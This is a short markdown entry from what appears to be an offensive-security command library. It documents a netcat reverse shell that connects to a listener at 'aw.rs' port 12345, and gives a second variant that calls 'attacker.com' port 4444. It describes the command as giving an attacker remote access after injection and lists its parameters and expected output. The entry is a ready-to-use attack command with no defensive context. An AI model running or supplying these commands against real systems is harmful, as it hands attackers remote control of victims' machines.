---
id: cmd-nc-reverse-shell
data: nc aw.rs 12345 -e /bin/sh
tags:
  - reverse-shell
  - nc
type: command
output: Shell connection established; commands executable on remote listener.
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:14.986Z'
verified: false
validated: true
submitted: true
---
# nc-reverse-shell

## Command

```bash
nc aw.rs 12345 -e /bin/sh
```

## Description

Establishes a reverse shell using netcat, connecting back to attacker's listener for remote access post-injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| aw.rs | Attacker domain/IP | Yes |
| 12345 | Port | Yes |
| -e /bin/sh | Execute shell | Yes |

## Examples

### Basic Usage

```bash
nc aw.rs 12345 -e /bin/sh
```

### Advanced Usage

```bash
nc -e /bin/sh attacker.com 4444
```

## Expected Output

Connection to listener; interactive shell available.

## Related

- [[procedures/Verify-Payload-Execution-and-Command-Injection]]
- [[tools/nc-netcat]]
